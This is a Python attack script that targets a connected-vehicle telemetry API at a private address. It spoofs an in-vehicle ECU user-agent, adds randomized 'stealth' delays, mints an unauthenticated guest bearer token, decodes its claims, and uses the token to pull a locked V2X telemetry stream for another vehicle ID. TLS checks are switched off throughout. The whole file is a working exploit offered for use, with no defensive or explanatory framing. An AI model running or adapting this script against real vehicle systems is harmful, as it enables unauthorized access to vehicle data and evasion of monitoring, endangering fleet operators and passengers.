#!/usr/bin/env python3
import base64
import json
import time
import random
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "192.168.1.168:30443"
BASE_URL = f"https://{TARGET}"
HEADERS = {
    "User-Agent": "WovenMobility-ePalette-ECU/4.2.1 (Linux; aarch64)",
    "Content-Type": "application/json"
}

def stealth_delay():
    delay = round(random.uniform(1.2, 2.8), 2)
    print(f"[~] Stealth jitter pause: {delay}s...")
    time.sleep(delay)

print("[*] [PHASE 2: E-PALETTE-PHANTOM] Initiating Encrypted Token Harvest...")
stealth_delay()

auth_resp = requests.post(f"{BASE_URL}/v1/auth/guest-token", headers=HEADERS, json={}, verify=False)
if auth_resp.status_code != 200:
    print(f"[-] Exploitation blocked. HTTP {auth_resp.status_code}")
    exit(1)

token = auth_resp.json().get("token")
print(f"[+] Minted Bearer Token (In-Memory): {token[:32]}...[REDACTED]")

payload_b64 = token.split(".")[1] + "=="
claims = json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8"))
print(f"[+] Decoded Token Claims: {json.dumps(claims)}")

print("[*] [PHASE 2: E-PALETTE-PHANTOM] Pivoting to Locked V2X Telemetry Stream...")
stealth_delay()

HEADERS["Authorization"] = f"Bearer {token}"
telem_resp = requests.get(f"{BASE_URL}/v1/telemetry/999", headers=HEADERS, verify=False)
print(f"[+] Telemetry Endpoint Status: HTTP {telem_resp.status_code}")
print(f"[+] Intercepted Payload: {telem_resp.text.strip()}")
